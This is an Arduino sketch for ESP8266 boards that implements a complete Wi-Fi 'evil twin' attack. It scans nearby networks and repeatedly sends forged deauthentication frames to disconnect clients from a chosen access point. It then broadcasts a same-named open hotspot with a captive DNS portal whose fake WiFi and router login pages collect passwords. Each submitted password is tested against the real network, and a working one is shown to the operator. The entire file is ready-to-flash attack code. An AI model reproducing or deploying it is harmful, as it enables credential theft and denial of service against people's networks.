#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

String _correctPassword = "";
String _attemptedPassword = "";
bool _hotspotActive = false;
bool _deauthActive = false;
bool _askUsername = false; // Nova variável para controlar o modo

void clearNetworks() {
  for (int i = 0; i < 16; i++) {
    _Network emptyNetwork;
    _networks[i] = emptyNetwork;
  }
}

void scanNetworks() {
  int n = WiFi.scanNetworks();
  clearNetworks();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

String generateWiFiLoginPage() {
  return String(
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "<title>WiFi Login</title>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "<style>"
    "body {font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 0;}"
    ".login-container {width: 300px; margin: 50px auto; background: #fff; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1);}"
    ".login-header {background: #3498db; color: #fff; padding: 15px; text-align: center; border-radius: 5px 5px 0 0;}"
    ".login-form {padding: 20px;}"
    ".form-group {margin-bottom: 15px;}"
    ".form-group label {display: block; margin-bottom: 5px; font-weight: bold;}"
    ".form-group input {width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ddd; border-radius: 3px;}"
    ".login-footer {text-align: center; padding: 15px; background: #f9f9f9; border-radius: 0 0 5px 5px;}"
    ".btn {padding: 8px 15px; border: none; border-radius: 3px; cursor: pointer;}"
    ".btn-login {background: #3498db; color: #fff;}"
    "</style>"
    "</head>"
    "<body>"
    "<div class='login-container'>"
    "<div class='login-header'><h2>WiFi Login Required</h2></div>"
    "<form method='post' action='/'>"
    "<div class='login-form'>"
    "<div class='form-group'>"
    "<label for='password'>WiFi Password</label>"
    "<input type='password' id='password' name='password' placeholder='Enter WiFi password' autocomplete='off' required>"
    "</div>"
    "</div>"
    "<div class='login-footer'>"
    "<button type='submit' class='btn btn-login'>Connect</button>"
    "</div>"
    "</form>"
    "</div>"
    "</body>"
    "</html>"
  );
}

String generateRouterLoginPage() {
  return String(
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "<title>Router Login</title>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "<style>"
    "body {font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 0;}"
    ".login-container {width: 300px; margin: 50px auto; background: #fff; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1);}"
    ".login-header {background: #3498db; color: #fff; padding: 15px; text-align: center; border-radius: 5px 5px 0 0;}"
    ".login-form {padding: 20px;}"
    ".form-group {margin-bottom: 15px;}"
    ".form-group label {display: block; margin-bottom: 5px; font-weight: bold;}"
    ".form-group input {width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ddd; border-radius: 3px;}"
    ".login-footer {text-align: center; padding: 15px; background: #f9f9f9; border-radius: 0 0 5px 5px;}"
    ".btn {padding: 8px 15px; border: none; border-radius: 3px; cursor: pointer;}"
    ".btn-login {background: #3498db; color: #fff;}"
    ".btn-reset {background: #95a5a6; color: #fff; margin-left: 10px;}"
    "</style>"
    "</head>"
    "<body>"
    "<div class='login-container'>"
    "<div class='login-header'><h2>Router Login</h2></div>"
    "<form method='post' action='/'>"
    "<div class='login-form'>"
    "<div class='form-group'>"
    "<label for='username'>Username</label>"
    "<input type='text' id='username' name='username' placeholder='admin' required>"
    "</div>"
    "<div class='form-group'>"
    "<label for='password'>Password</label>"
    "<input type='password' id='password' name='password' placeholder='password' autocomplete='off' required>"
    "</div>"
    "</div>"
    "<div class='login-footer'>"
    "<button type='submit' class='btn btn-login'>Login</button>"
    "<button type='reset' class='btn btn-reset'>Reset</button>"
    "</div>"
    "</form>"
    "</div>"
    "</body>"
    "</html>"
  );
}

String generateResultPage(bool success) {
  if (success) {
    return String(
      "<!DOCTYPE html>"
      "<html>"
      "<head>"
      "<title>Login Successful</title>"
      "<meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
      "<style>"
      "body {font-family: Arial, sans-serif; text-align: center; padding: 50px;}"
      ".success {color: #27ae60; font-size: 24px;}"
      "</style>"
      "</head>"
      "<body>"
      "<div class='success'>Login Successful!</div>"
      "<p>You will be redirected shortly.</p>"
      "</body>"
      "</html>"
    );
  } else {
    return String(
      "<!DOCTYPE html>"
      "<html>"
      "<head>"
      "<title>Login Failed</title>"
      "<meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
      "<style>"
      "body {font-family: Arial, sans-serif; text-align: center; padding: 50px;}"
      ".error {color: #e74c3c; font-size: 24px;}"
      "</style>"
      "<script>setTimeout(function(){ window.location='/'; }, 3000);</script>"
      "</head>"
      "<body>"
      "<div class='error'>Login Failed</div>"
      "<p>Please try again. Redirecting...</p>"
      "</body>"
      "</html>"
    );
  }
}

void handleRoot() {
  if (_hotspotActive) {
    if (webServer.hasArg("password")) {
      _attemptedPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _attemptedPassword.c_str(), 
                _selectedNetwork.ch, _selectedNetwork.bssid);
      
      webServer.send(200, "text/html", 
        "<!DOCTYPE html>"
        "<html>"
        "<head>"
        "<title>Verifying</title>"
        "<meta name='viewport' content='width=device-width'>"
        "<script>setTimeout(function(){ window.location='/result'; }, 10000);</script>"
        "</head>"
        "<body>"
        "<h2>Verifying credentials...</h2>"
        "<p>Please wait while we verify your login.</p>"
        "</body>"
        "</html>"
      );
    } else {
      if (_askUsername) {
        webServer.send(200, "text/html", generateRouterLoginPage());
      } else {
        webServer.send(200, "text/html", generateWiFiLoginPage());
      }
    }
  } else {
    String page = String(
      "<html>"
      "<head>"
      "<title>WiFi Networks</title>"
      "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
      "<style>"
      "body {font-family: Arial, sans-serif;}"
      "table {width: 100%; border-collapse: collapse;}"
      "th, td {border: 1px solid #ddd; padding: 8px; text-align: left;}"
      "th {background-color: #3498db; color: white;}"
      "button {padding: 5px 10px; margin: 2px;}"
      ".selected {background-color: #d4edda;}"
      ".mode-switch {margin: 10px; padding: 5px; background: #f1f1f1; border-radius: 5px;}"
      "</style>"
      "</head>"
      "<body>"
      "<h2>Available Networks</h2>"
      "<div class='mode-switch'>"
      "<form method='post' action='/mode'>"
      "<label>Login Mode: </label>"
      "<button type='submit' name='mode' value='wifi'>WiFi Password Only</button>"
      "<button type='submit' name='mode' value='router'>Router Login</button>"
      "</form>"
      "<p>Current Mode: " + String(_askUsername ? "Router Login (user + pass)" : "WiFi Password Only") + "</p>"
      "</div>"
      "<table>"
      "<tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Action</th></tr>"
    );

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      
      page += "<tr><td>" + _networks[i].ssid + "</td>";
      page += "<td>" + String(_networks[i].bssid[0], HEX) + ":" + String(_networks[i].bssid[1], HEX) + ":" + 
              String(_networks[i].bssid[2], HEX) + ":" + String(_networks[i].bssid[3], HEX) + ":" + 
              String(_networks[i].bssid[4], HEX) + ":" + String(_networks[i].bssid[5], HEX) + "</td>";
      page += "<td>" + String(_networks[i].ch) + "</td>";
      page += "<td><form method='post' action='/select'><input type='hidden' name='bssid' value='" + 
              String(_networks[i].bssid[0]) + "," + String(_networks[i].bssid[1]) + "," + 
              String(_networks[i].bssid[2]) + "," + String(_networks[i].bssid[3]) + "," + 
              String(_networks[i].bssid[4]) + "," + String(_networks[i].bssid[5]) + "'>" +
              "<button type='submit'>Select</button></form></td></tr>";
    }

    page += "</table>";

    if (_selectedNetwork.ssid != "") {
      page += "<h3>Selected: " + _selectedNetwork.ssid + "</h3>";
      page += "<form method='post' action='/deauth'>";
      page += "<button type='submit' name='action' value='" + String(_deauthActive ? "stop" : "start") + "'>";
      page += String(_deauthActive ? "Stop Deauth" : "Start Deauth") + "</button>";
      page += "</form>";

      page += "<form method='post' action='/hotspot'>";
      page += "<button type='submit' name='action' value='" + String(_hotspotActive ? "stop" : "start") + "'>";
      page += String(_hotspotActive ? "Stop Hotspot" : "Start Hotspot") + "</button>";
      page += "</form>";
    }

    if (_correctPassword != "") {
      page += "<h3>" + _correctPassword + "</h3>";
    }

    page += "</body></html>";
    webServer.send(200, "text/html", page);
  }
}

void handleMode() {
  if (webServer.hasArg("mode")) {
    _askUsername = (webServer.arg("mode") == "router");
  }
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleSelect() {
  if (webServer.hasArg("bssid")) {
    String bssidStr = webServer.arg("bssid");
    uint8_t bssid[6];
    int values[6];
    
    sscanf(bssidStr.c_str(), "%d,%d,%d,%d,%d,%d", 
           &values[0], &values[1], &values[2], 
           &values[3], &values[4], &values[5]);
    
    for (int i = 0; i < 6; i++) {
      bssid[i] = (uint8_t)values[i];
    }

    for (int i = 0; i < 16; i++) {
      if (memcmp(_networks[i].bssid, bssid, 6) == 0) {
        _selectedNetwork = _networks[i];
        break;
      }
    }
  }
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleDeauth() {
  if (webServer.hasArg("action")) {
    _deauthActive = (webServer.arg("action") == "start");
  }
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleHotspot() {
  if (webServer.hasArg("action")) {
    _hotspotActive = (webServer.arg("action") == "start");
    
    if (_hotspotActive) {
      WiFi.softAPdisconnect(true);
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    } else {
      WiFi.softAPdisconnect(true);
      WiFi.softAP("WiFi_Setup", "setup1234");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    }
  }
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleResult() {
  if (WiFi.status() == WL_CONNECTED) {
    _deauthActive = false;
    _hotspotActive = false;
    _correctPassword = "Password found for " + _selectedNetwork.ssid + ": " + _attemptedPassword;
    webServer.send(200, "text/html", generateResultPage(true));
    
    WiFi.softAPdisconnect(true);
    WiFi.softAP("WiFi_Setup", "setup1234");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    
    Serial.println(_correctPassword);
  } else {
    webServer.send(200, "text/html", generateResultPage(false));
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiFi_Setup", "setup1234");
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleRoot);
  webServer.on("/mode", handleMode);
  webServer.on("/select", handleSelect);
  webServer.on("/deauth", handleDeauth);
  webServer.on("/hotspot", handleHotspot);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleRoot);
  
  webServer.begin();
  scanNetworks();
}

void sendDeauthPacket() {
  wifi_set_channel(_selectedNetwork.ch);
  
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0x00, 0x00, 0x01, 0x00
  };
  
  memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
  memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
  
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

unsigned long lastScanTime = 0;
unsigned long lastDeauthTime = 0;
const unsigned long scanInterval = 15000;
const unsigned long deauthInterval = 1000;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (_deauthActive && millis() - lastDeauthTime >= deauthInterval) {
    sendDeauthPacket();
    lastDeauthTime = millis();
  }

  if (millis() - lastScanTime >= scanInterval) {
    scanNetworks();
    lastScanTime = millis();
  }
}
